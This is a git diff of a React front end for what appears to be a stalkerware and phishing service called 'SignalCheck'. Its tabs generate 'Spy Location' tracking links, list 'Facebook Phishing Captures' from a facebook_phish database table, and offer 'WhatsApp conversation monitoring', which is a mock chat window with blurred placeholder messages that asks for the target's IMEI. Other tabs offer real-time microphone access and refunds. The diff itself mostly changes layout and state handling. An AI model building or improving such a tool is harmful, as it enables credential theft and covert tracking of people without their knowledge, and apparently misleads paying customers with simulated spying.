@@ -4,41 +4,33 @@ import LinkGenerator from './LinkGenerator';
 import LinksList from './LinksList';
 import Sidebar from './Sidebar';
 import { supabase } from '../supabase';
-import { FaWhatsapp, FaInstagram, FaFacebookF, FaMicrophone, FaMapMarkerAlt, FaBook, FaHome } from 'react-icons/fa';
-import { useLocation, useNavigate } from 'react-router-dom';
-import IMEISupportRequest from '../pages/IMEISupportRequest';
 
 function FacebookCaptures() {
   const [links, setLinks] = useState([]);
   const usuario = localStorage.getItem('usuario');
-
-  async function fetchLinks() {
-    const { data } = await supabase
-      .from('facebook_phish')
-      .select('*')
-      .eq('email', usuario)
-      .order('created_at', { ascending: false });
-    setLinks(data || []);
-  }
-
   useEffect(() => {
+    async function fetchLinks() {
+      const { data } = await supabase
+        .from('facebook_phish')
+        .select('*')
+        .eq('email', usuario)
+        .order('created_at', { ascending: false });
+      setLinks(data || []);
+    }
     fetchLinks();
   }, []);
 
   return (
-    <div style={{ margin: '2rem 0', textAlign: 'center', width: '100%' }}>
-      <h3 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', margin: '1.5rem 0 1rem 0', width: '100%' }}>Facebook Phishing Captures</h3>
-      <button onClick={fetchLinks} style={{ display: 'block', margin: '0 auto 1.5rem auto', background: 'var(--cinza-conspiracao)', color: 'var(--branco-confissao)', borderRadius: 8, padding: '0.5rem 1.5rem', fontFamily: 'Montserrat', fontWeight: 'bold', fontSize: '1rem', border: 'none', cursor: 'pointer', marginTop: 10 }}>Refresh list</button>
-      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)', textAlign: 'center', margin: '0 0 1.5rem 0', width: '100%' }}>No phishing links created yet.</p>}
+    <div style={{ margin: '2rem 0' }}>
+      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Facebook Phishing Captures</h3>
+      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)' }}>No phishing links created yet.</p>}
       {links.map(link => (
         <div key={link.id} style={{
           background: 'var(--fundo-destaque)',
           borderRadius: 10,
-          margin: '1rem auto',
+          margin: '1rem 0',
           padding: '1rem',
-          boxShadow: '0 2px 8px rgba(76,76,76,0.08)',
-          maxWidth: 420,
-          textAlign: 'left',
+          boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
         }}>
           <div style={{ marginBottom: 8 }}>
             <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
@@ -198,158 +190,34 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
   const chatTimes = [
     '09:42', '10:24', '13:58', '18:02', '18:05', '18:08', '19:01', '19:10', '20:02', '21:10'
   ];
-  // Mensagens simuladas para cada chat (agora com mais mensagens e alternância)
-  const chatMessages = [
-    [
-      { fromMe: false, text: 'Hey, are you there?', time: '09:42' },
-      { fromMe: false, text: 'Just checking in.', time: '09:43' },
-      { fromMe: false, text: 'Did you get my last message?', time: '09:44' },
-      { fromMe: true, text: 'Yes, who is this?', time: '09:45' },
-      { fromMe: false, text: 'It’s me, Unknown.', time: '09:46' },
-      { fromMe: false, text: 'Can you help me?', time: '09:47' },
-      { fromMe: true, text: 'Depends, what do you need?', time: '09:48' },
-      { fromMe: true, text: 'I’m a bit busy now.', time: '09:49' },
-      { fromMe: true, text: 'But I can try.', time: '09:50' },
-      { fromMe: false, text: 'No worries, just wanted to say hi.', time: '09:51' },
-      { fromMe: false, text: 'Talk later!', time: '09:52' },
-      { fromMe: true, text: 'Sure, bye!', time: '09:53' },
-      { fromMe: false, text: 'Did you see the game?', time: '09:54' },
-      { fromMe: true, text: 'Not yet, no spoilers!', time: '09:55' },
-      { fromMe: false, text: 'Okay, I won’t spoil it.', time: '09:56' },
-      { fromMe: true, text: 'Thanks!', time: '09:57' },
-      { fromMe: false, text: 'Bye!', time: '09:58' },
-      { fromMe: true, text: 'Bye!', time: '09:59' },
-    ],
-    [
-      { fromMe: false, text: 'Did you see the news?', time: '10:24' },
-      { fromMe: false, text: 'It’s all over the place.', time: '10:25' },
-      { fromMe: true, text: 'No, what happened?', time: '10:26' },
-      { fromMe: true, text: 'Send me the link.', time: '10:27' },
-      { fromMe: false, text: 'I will send soon.', time: '10:28' },
-      { fromMe: false, text: 'Check your email.', time: '10:29' },
-      { fromMe: true, text: 'Got it, thanks!', time: '10:30' },
-      { fromMe: true, text: 'Crazy stuff!', time: '10:31' },
-      { fromMe: false, text: 'Right?', time: '10:32' },
-      { fromMe: false, text: 'Let’s talk later.', time: '10:33' },
-      { fromMe: true, text: 'Sure!', time: '10:34' },
-    ],
-    [
-      { fromMe: false, text: 'Are you coming to the party?', time: '13:58' },
-      { fromMe: false, text: 'Everyone will be there.', time: '13:59' },
-      { fromMe: true, text: 'Maybe, not sure yet.', time: '14:00' },
-      { fromMe: true, text: 'Who else is going?', time: '14:01' },
-      { fromMe: false, text: 'A lot of people!', time: '14:02' },
-      { fromMe: false, text: 'You should come!', time: '14:03' },
-      { fromMe: true, text: 'I’ll try!', time: '14:04' },
-      { fromMe: true, text: 'Send me the address.', time: '14:05' },
-      { fromMe: false, text: 'Sent!', time: '14:06' },
-      { fromMe: false, text: 'See you there!', time: '14:07' },
-      { fromMe: true, text: 'Thanks!', time: '14:08' },
-    ],
-    [
-      { fromMe: false, text: 'Send me the files.', time: '18:02' },
-      { fromMe: false, text: 'I need them ASAP.', time: '18:03' },
-      { fromMe: true, text: 'I will send soon.', time: '18:04' },
-      { fromMe: true, text: 'Just finishing up.', time: '18:05' },
-      { fromMe: false, text: 'Thanks!', time: '18:06' },
-      { fromMe: false, text: 'You’re the best.', time: '18:07' },
-      { fromMe: true, text: 'No problem!', time: '18:08' },
-      { fromMe: true, text: 'Check your email.', time: '18:09' },
-      { fromMe: false, text: 'Got it!', time: '18:10' },
-      { fromMe: false, text: 'Talk soon.', time: '18:11' },
-      { fromMe: true, text: 'Bye!', time: '18:12' },
-    ],
-    [
-      { fromMe: false, text: 'Can you help me?', time: '18:05' },
-      { fromMe: false, text: 'I’m stuck on something.', time: '18:06' },
-      { fromMe: true, text: 'Depends, what do you need?', time: '18:07' },
-      { fromMe: true, text: 'Maybe I can help.', time: '18:08' },
-      { fromMe: false, text: 'Just some advice.', time: '18:09' },
-      { fromMe: false, text: 'It’s about work.', time: '18:10' },
-      { fromMe: true, text: 'Let’s talk!', time: '18:11' },
-      { fromMe: true, text: 'Call me?', time: '18:12' },
-      { fromMe: false, text: 'Sure!', time: '18:13' },
-      { fromMe: false, text: 'Thanks!', time: '18:14' },
-      { fromMe: true, text: 'Anytime!', time: '18:15' },
-    ],
-    [
-      { fromMe: false, text: 'Let’s meet tomorrow.', time: '18:08' },
-      { fromMe: false, text: 'What time?', time: '18:09' },
-      { fromMe: true, text: '10am at the cafe.', time: '18:10' },
-      { fromMe: true, text: 'See you there!', time: '18:11' },
-      { fromMe: false, text: 'Great!', time: '18:12' },
-      { fromMe: false, text: 'Don’t be late.', time: '18:13' },
-      { fromMe: true, text: 'I won’t!', time: '18:14' },
-      { fromMe: true, text: 'Looking forward to it.', time: '18:15' },
-      { fromMe: false, text: 'Me too!', time: '18:16' },
-      { fromMe: false, text: 'Bye!', time: '18:17' },
-      { fromMe: true, text: 'Bye!', time: '18:18' },
-    ],
-    [
-      { fromMe: false, text: 'Your project is awesome!', time: '19:01' },
-      { fromMe: false, text: 'Keep it up!', time: '19:02' },
-      { fromMe: true, text: 'Thank you!', time: '19:03' },
-      { fromMe: true, text: 'Means a lot!', time: '19:04' },
-      { fromMe: false, text: 'No problem!', time: '19:05' },
-      { fromMe: false, text: 'Let’s catch up soon.', time: '19:06' },
-      { fromMe: true, text: 'Sure!', time: '19:07' },
-      { fromMe: true, text: 'Ping me anytime.', time: '19:08' },
-      { fromMe: false, text: 'Will do!', time: '19:09' },
-      { fromMe: false, text: 'Bye!', time: '19:10' },
-      { fromMe: true, text: 'Bye!', time: '19:11' },
-    ],
-    [
-      { fromMe: false, text: 'Call me when you can.', time: '19:10' },
-      { fromMe: false, text: 'It’s urgent.', time: '19:11' },
-      { fromMe: true, text: 'Will do!', time: '19:12' },
-      { fromMe: true, text: 'Is everything ok?', time: '19:13' },
-      { fromMe: false, text: 'Yes, just need to talk.', time: '19:14' },
-      { fromMe: false, text: 'Call me back.', time: '19:15' },
-      { fromMe: true, text: 'I will!', time: '19:16' },
-      { fromMe: true, text: 'Give me 5 minutes.', time: '19:17' },
-      { fromMe: false, text: 'Ok!', time: '19:18' },
-      { fromMe: false, text: 'Thanks!', time: '19:19' },
-      { fromMe: true, text: 'Anytime!', time: '19:20' },
-    ],
-    [
-      { fromMe: false, text: 'Check your email.', time: '20:02' },
-      { fromMe: false, text: 'I sent the document.', time: '20:03' },
-      { fromMe: true, text: 'Just checked, thanks!', time: '20:04' },
-      { fromMe: true, text: 'Looks good!', time: '20:05' },
-      { fromMe: false, text: 'Let me know if you need changes.', time: '20:06' },
-      { fromMe: false, text: 'I’m here.', time: '20:07' },
-      { fromMe: true, text: 'All good!', time: '20:08' },
-      { fromMe: true, text: 'Thanks again!', time: '20:09' },
-      { fromMe: false, text: 'No problem.', time: '20:10' },
-      { fromMe: false, text: 'Bye!', time: '20:11' },
-      { fromMe: true, text: 'Bye!', time: '20:12' },
-    ],
-    [
-      { fromMe: false, text: 'Let’s go for a walk.', time: '21:10' },
-      { fromMe: false, text: 'It’s nice outside.', time: '21:11' },
-      { fromMe: true, text: 'Great idea!', time: '21:12' },
-      { fromMe: true, text: 'Where should we meet?', time: '21:13' },
-      { fromMe: false, text: 'At the park.', time: '21:14' },
-      { fromMe: false, text: 'See you soon.', time: '21:15' },
-      { fromMe: true, text: 'See you!', time: '21:16' },
-      { fromMe: true, text: 'On my way.', time: '21:17' },
-      { fromMe: false, text: 'Ok!', time: '21:18' },
-      { fromMe: false, text: 'Bye!', time: '21:19' },
-      { fromMe: true, text: 'Bye!', time: '21:20' },
-    ],
-  ];
   const chats = chatTimes.map((time, i) => ({
     name: 'Unknown',
     last: 'This message was not loaded, please wait...',
     time,
     avatar: '?',
-    messages: chatMessages[i],
+    messages: [
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '09:42' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '10:24' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '13:58' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '18:02' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '18:05' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '18:08' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '19:01' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '19:10' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '20:02' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '20:15' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '20:30' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '20:45' },
+      { fromMe: false, text: 'This message was not loaded, please wait...', time: '21:00' },
+      { fromMe: true, text: 'This message was not loaded, please wait...', time: '21:10' },
+    ]
   }));
   const chat = chats[selected];
+  // sortedMessages local
   const sortedMessages = chat && chat.messages ? [...chat.messages].sort((a, b) => {
     const [hA, mA] = a.time.split(":").map(Number);
     const [hB, mB] = b.time.split(":").map(Number);
-    return hA * 60 + mA - (hB * 60 + mB);
+    return hB * 60 + mB - (hA * 60 + mA);
   }) : [];
 
   return (
@@ -366,24 +234,17 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
       boxShadow: '0 2px 8px #0001',
       maxWidth: 1100,
       margin: '32px auto',
-      padding: 0,
-      width: window.innerWidth <= 700 ? '100vw' : undefined,
-      minWidth: window.innerWidth <= 700 ? 320 : undefined,
-      overflowX: window.innerWidth <= 700 ? 'auto' : undefined,
-      overflowY: window.innerWidth <= 700 ? 'auto' : undefined,
-      boxSizing: 'border-box',
+      padding: 0
     }}>
       {/* Sidebar de chats */}
       <div style={{
-        width: window.innerWidth <= 700 ? 180 : 220,
+        width: 320,
         background: '#202c33',
         borderRadius: '16px 0 0 16px',
         boxShadow: '0 2px 8px #0001',
         display: 'flex', flexDirection: 'column', alignItems: 'stretch',
         borderRight: '1.5px solid #232323',
-        minHeight: 520,
-        overflowY: 'auto',
-        boxSizing: 'border-box',
+        minHeight: 520
       }}>
         <div style={{ padding: '1.2rem 1.2rem 0.7rem 1.2rem', borderBottom: '1.5px solid #232323' }}>
           <input disabled placeholder="Search or start new chat" style={{
@@ -393,38 +254,22 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
         <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem 0' }}>
           {chats.map((c, i) => (
             <div key={i} onClick={() => setSelected(i)} style={{
-              display: 'flex', alignItems: 'center', gap: 10, padding: '0.7rem 0.7rem', cursor: 'pointer',
+              display: 'flex', alignItems: 'center', gap: 14, padding: '0.7rem 1.1rem', cursor: 'pointer',
               background: selected === i ? '#232d36' : 'transparent',
               borderLeft: selected === i ? '3px solid #25d366' : '3px solid transparent',
-              borderRadius: 8, marginBottom: 2, transition: 'background 0.2s',
-              maxWidth: '100%', minWidth: 0, boxSizing: 'border-box',
+              borderRadius: 8, marginBottom: 2, transition: 'background 0.2s'
             }}>
-              {/* <div style={{ width: 32, height: 32, borderRadius: '50%', background: '#232d36', color: '#25d366', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>{c.avatar}</div> */}
+              <div style={{ width: 38, height: 38, borderRadius: '50%', background: '#232d36', color: '#25d366', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 20 }}>{c.avatar}</div>
               <div style={{ flex: 1, minWidth: 0 }}>
-                <div style={{ fontWeight: 600, color: '#e9edef', fontSize: '0.98rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.name}</div>
-                <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginTop: 2, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 120 }}>{c.last}</div>
+                <div style={{ fontWeight: 600, color: '#e9edef', fontSize: '1rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.name}</div>
+                <div style={{ color: '#b0b0b0', fontSize: '0.97rem', marginTop: 2, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.last}</div>
               </div>
-              <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginLeft: 6, flexShrink: 0 }}>{c.time}</div>
+              <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginLeft: 10, flexShrink: 0 }}>{c.time}</div>
             </div>
           ))}
-          <button
-            onClick={() => setShowLoadMoreMsg(true)}
-            style={{
-              width: '90%',
-              margin: '16px auto 8px auto',
-              display: 'block',
-              background: '#232d36',
-              color: '#25d366',
-              border: 'none',
-              borderRadius: 8,
-              padding: '0.7rem 1.2rem',
-              fontWeight: 700,
-              fontSize: 15,
-              cursor: 'pointer'
-            }}
-          >
-            Load more chats
-          </button>
+          <button onClick={() => setShowLoadMoreMsg(true)} style={{
+            width: '90%', margin: '16px auto 8px auto', display: 'block', background: '#232d36', color: '#25d366', border: 'none', borderRadius: 8, padding: '0.7rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'pointer'
+          }}>Carregar mais chats</button>
         </div>
       </div>
       {/* Área de chat */}
@@ -433,25 +278,20 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
         background: 'transparent',
         borderRadius: '0 16px 16px 0',
         display: 'flex', flexDirection: 'column', alignItems: 'stretch',
-        minHeight: 520,
-        width: window.innerWidth <= 700 ? '100vw' : '100%',
-        boxSizing: 'border-box',
-        overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
-        padding: window.innerWidth <= 700 ? '0 0.5rem' : 0,
+        minHeight: 520
       }}>
         {showLoadMoreMsg ? (
           <div style={{
             background: 'transparent',
             borderRadius: 14,
             boxShadow: 'none',
-            padding: window.innerWidth <= 700 ? '1rem 0.2rem' : '2.5rem 2.2rem',
+            padding: '2.5rem 2.2rem',
+            maxWidth: 700,
             width: '100%',
-            margin: window.innerWidth <= 700 ? '16px 0 0 0' : '32px auto 0 auto',
+            margin: '32px auto 0 auto',
             minHeight: 320,
             maxHeight: 420,
             display: 'flex', alignItems: 'center', justifyContent: 'center',
-            boxSizing: 'border-box',
-            overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
           }}>
             <span style={{ color: '#E60033', fontWeight: 600, fontSize: 18, textAlign: 'center' }}>
               You do not have access to the content of this chat. The IMEI must be filled in correctly to access the conversations.
@@ -463,20 +303,19 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
         <div style={{
           width: '100%',
           background: '#202c33',
-          borderRadius: window.innerWidth <= 700 ? '0' : '0 14px 0 0',
+          borderRadius: '0 14px 0 0',
           boxShadow: '0 2px 8px #0001',
-          padding: window.innerWidth <= 700 ? '0.7rem 0.2rem' : '1.2rem 2.2rem',
-          display: 'flex', alignItems: 'center', gap: 16,
-          boxSizing: 'border-box',
-          overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
+          padding: '1.2rem 2.2rem',
+          display: 'flex', alignItems: 'center', gap: 16
         }}>
-          {/* Avatar removido */}
+          <div style={{ width: 44, height: 44, borderRadius: '50%', background: '#25d366', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>?</div>
           <div>
             <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>Unknown</div>
             <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
           </div>
-          {/* Ícones de ligação e vídeo removidos */}
           <div style={{ marginLeft: 18, display: 'flex', gap: 12 }}>
+            <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📞</span>
+            <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📹</span>
             <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>⋮</span>
           </div>
         </div>
@@ -485,14 +324,13 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
           background: 'transparent',
           borderRadius: 14,
           boxShadow: 'none',
-          padding: window.innerWidth <= 700 ? '0.7rem 0.1rem' : '1.5rem 2.2rem',
+          padding: '1.5rem 2.2rem',
+          maxWidth: 700,
           width: '100%',
           minHeight: 320,
           maxHeight: 420,
           overflowY: 'auto',
-          overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
-          display: 'flex', flexDirection: 'column', gap: 0,
-          boxSizing: 'border-box',
+          display: 'flex', flexDirection: 'column', gap: 0
         }}>
               {sortedMessages.map((msg, i) => (
             <div key={i} style={{
@@ -506,14 +344,13 @@ function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
                 padding: '0.7rem 1.1rem',
                 minWidth: 60,
                 maxWidth: '70%',
-                fontSize: window.innerWidth <= 700 ? 13 : 15,
+                fontSize: 15,
                 position: 'relative',
                 filter: 'blur(3px) grayscale(0.3) brightness(0.7)',
                 userSelect: 'none',
                 cursor: 'not-allowed',
                 marginLeft: msg.fromMe ? 0 : 8,
-                    marginRight: msg.fromMe ? 8 : 0,
-                    boxSizing: 'border-box',
+                marginRight: msg.fromMe ? 8 : 0
               }}>
                 <span style={{ color: '#25d366', fontSize: 18, marginRight: 6 }}>💬</span>
                 {msg.text}
@@ -637,7 +474,7 @@ function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
               {deviceModels.map(m => <option key={m} value={m}>{m}</option>)}
             </select>
           </div>
-          <div style={{ marginBottom: 8, textAlign: 'left' }}>
+          <div style={{ marginBottom: 18, textAlign: 'left' }}>
             <label>IMEI</label>
             <input type="text" value={imei} onChange={e => setImei(e.target.value)} required placeholder="e.g. 356938035643809" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
           </div>
@@ -690,484 +527,61 @@ function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
 }
 
 export default function Dashboard({ email }) {
-  const location = useLocation();
-  const navigate = useNavigate();
-  const [active, setActive] = useState('Home');
+  const [active, setActive] = useState(() => localStorage.getItem('dashboardActiveTab') || 'Spy Location');
   const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);
-  const [selected, setSelected] = useState(0);
-  const [showIMEISupport, setShowIMEISupport] = useState(false);
-  // Blocos de ferramentas
-  const tools = [
-    { label: 'Lessons', icon: <FaBook size={44} color="#E60033" />, desc: 'Tutorials and instructions' },
-    { label: 'Spy Location', icon: <FaMapMarkerAlt size={44} color="#25d366" />, desc: 'Real-time location' },
-    { label: 'WhatsApp', icon: <FaWhatsapp size={44} color="#25d366" />, desc: 'Conversation monitoring' },
-    { label: 'Instagram', icon: <FaInstagram size={44} color="#E1306C" />, desc: 'Coming soon...' },
-    { label: 'Facebook', icon: <FaFacebookF size={44} color="#1877f3" />, desc: 'Phishing captures' },
-    { label: 'Microphone', icon: <FaMicrophone size={44} color="#fff" />, desc: 'Real-time audio' },
-    { label: 'Support and refund', icon: <FaHome size={44} color="#E60033" />, desc: 'Help and refunds' },
-  ];
-
-  // Itens da sidebar (inclui Home)
-  const sidebarItems = [
-    { label: 'Home', icon: <FaHome size={24} /> },
-    ...tools.map(t => ({ label: t.label, icon: t.icon })),
-  ];
 
   useEffect(() => {
-    console.log('[DASHBOARD] PATHNAME:', location.pathname, '| active antes:', active);
-    if (location.pathname === '/faq') setActive('FAQ');
-    else if (location.pathname === '/support') setActive('Support and refund');
-    else if (location.pathname === '/whatsapp') setActive('WhatsApp');
-    else if (location.pathname === '/spy-location') setActive('Spy Location');
-    else if (location.pathname === '/facebook') setActive('Facebook');
-    else if (location.pathname === '/microphone') setActive('Microphone');
-    else if (location.pathname === '/instagram') setActive('Instagram');
-    else if (location.pathname === '/lessons') setActive('Lessons');
-    else if (location.pathname === '/') setActive('Home');
-    // Não altere active para Home em outras rotas!
-    setTimeout(() => {
-      console.log('[DASHBOARD] PATHNAME após setActive:', location.pathname, '| active agora:', active);
-    }, 100);
-  }, [location.pathname]);
-
-  useEffect(() => {
-    setShowIMEISupport(false);
+    localStorage.setItem('dashboardActiveTab', active);
   }, [active]);
 
-  // Remover o useEffect que navega com base em active!
-
   return (
-    <>
-      <Header />
     <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
-        <Sidebar active={active} setActive={setActive} items={sidebarItems} />
-        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '2rem 0', maxWidth: '100vw', boxSizing: 'border-box' }}>
-          {active === 'Home' && (
-            <>
-              <h1 style={{ color: 'var(--vermelho)', fontFamily: 'Poppins, Inter, Arial', fontWeight: 800, fontSize: '2.2rem', margin: '1.5rem auto 0.5rem auto', letterSpacing: 1, textAlign: 'center', maxWidth: 700, width: '100%' }}>Welcome to SignalCheck</h1>
-              <p style={{ color: 'var(--cinza-claro)', fontSize: '1.15rem', margin: '0 auto 2.5rem auto', textAlign: 'center', maxWidth: 520, width: '100%', padding: '0 0.5rem' }}>
-                Select a tool below to get started. All features are organized in blocks for easy access.
-              </p>
-      <div style={{
-                display: 'grid',
-                gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
-                gap: '2rem',
-                width: '100%',
+      <Sidebar active={active} onSelect={setActive} />
+      <div className="dashboard-main" style={{
+        flex: 1,
+        marginLeft: 220,
+        padding: '2.5rem 1rem 1.5rem 1rem',
         maxWidth: 900,
-                margin: '2rem auto',
-                padding: '0 0.5rem',
-                boxSizing: 'border-box',
-              }}>
-                {tools.map(tool => (
-                  <div
-                    key={tool.label}
-                    onClick={() => setActive(tool.label)}
-                    style={{
-                      background: 'linear-gradient(135deg, #232d36 60%, #181a1b 100%)',
-                      borderRadius: 18,
-                      boxShadow: '0 4px 24px 0 #0007',
-                      border: '1.5px solid #232323',
-                      padding: '2.2rem 1.2rem',
+        width: '100%',
+        marginRight: 'auto',
+        marginTop: 0,
         display: 'flex',
         flexDirection: 'column',
         alignItems: 'center',
-                      justifyContent: 'center',
-                      cursor: 'pointer',
-                      transition: 'box-shadow 0.22s, background 0.22s, transform 0.18s',
-                      fontSize: 22,
-                      fontWeight: 600,
-                      color: '#fff',
-                      minHeight: 150,
-                      textAlign: 'center',
-                      gap: 18,
-                      position: 'relative',
-                      outline: 'none',
-                      width: '100%',
-                      boxSizing: 'border-box',
-                    }}
-                    tabIndex={0}
-                    onKeyDown={e => (e.key === 'Enter' || e.key === ' ') && setActive(tool.label)}
-                    onMouseOver={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
-                    onMouseOut={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
-                    onFocus={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
-                    onBlur={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
-                  >
-                    {tool.icon}
-                    <span style={{ fontSize: 1.18 + 'rem', fontWeight: 700, letterSpacing: 0.5 }}>{tool.label}</span>
-                    <span style={{ color: '#b0b0b0', fontSize: '1rem', fontWeight: 400, marginTop: 8 }}>{tool.desc}</span>
-                  </div>
-                ))}
-              </div>
-            </>
-          )}
-          {active === 'WhatsApp' && !showIMEISupport && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
-                <FaWhatsapp size={36} color="#25d366" />
-                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>WhatsApp</h2>
-              </div>
+        justifyContent: 'flex-start',
+      }}>
+        <Header />
+        <div style={{ width: '100%', maxWidth: 600 }}>
+          <div className="card-glass">
+            <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8, fontFamily: 'Poppins' }}>Secret Dashboard</h2>
+            <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32, fontSize: 17 }}>Welcome, <b>{email}</b>!</p>
+            {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
+            {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
+            {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
+            {active === 'WhatsApp' && (
               <WhatsAppSim
-                onBack={() => setActive('Home')}
+                onBack={() => setShowLoadMoreMsg(false)}
                 showLoadMoreMsg={showLoadMoreMsg}
                 setShowLoadMoreMsg={setShowLoadMoreMsg}
               />
-              <span
-                onClick={e => {
-                  e.preventDefault();
-                  setShowIMEISupport(true);
-                  console.log('[IMEI] Link clicked, showIMEISupport:', true);
-                }}
-                style={{
-                  display: 'block',
-                  marginTop: 6,
-                  color: '#25d366',
-                  fontSize: 14,
-                  textDecoration: 'underline',
-                  cursor: 'pointer'
-                }}
-              >
-                How to get your IMEI?
-              </span>
-            </div>
-          )}
-          {showIMEISupport && (
-            <IMEISupportRequest />
-          )}
-          {active === 'Spy Location' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
-                <FaMapMarkerAlt size={36} color="#25d366" />
-                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Spy Location</h2>
-              </div>
-              <div>
-                <LinkGenerator />
-                <LinksList />
-              </div>
-            </div>
-          )}
-          {active === 'Facebook' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
-                <FaFacebookF size={36} color="#1877f3" />
-                <h2 style={{ color: '#1877f3', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Facebook</h2>
-              </div>
-              <div>
-                <LinkGenerator onlyFacebook />
-                <FacebookCaptures />
-              </div>
-            </div>
-          )}
-          {active === 'Microphone' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
-                <FaMicrophone size={36} color="#fff" />
-                <h2 style={{ color: '#fff', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Microphone</h2>
-              </div>
-              <MicrophonePlaceholder />
-            </div>
-          )}
-          {active === 'Instagram' && (
-            <div style={{ color: '#fff', fontSize: 22, marginTop: 40, textAlign: 'center', width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <FaInstagram size={36} color="#E1306C" />
-              <h2 style={{ color: '#E1306C', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Instagram</h2>
-              <div style={{ marginTop: 16, color: '#b0b0b0', fontSize: 17, maxWidth: 400 }}>
-                <b>Instagram is currently under maintenance.</b><br />
-                Our team is working to restore this feature as soon as possible.<br />
-                Please check back later.
-              </div>
-              <div style={{ marginTop: 32 }}>
-                <span className="spinner" style={{
-                  display: 'inline-block',
-                  width: 40,
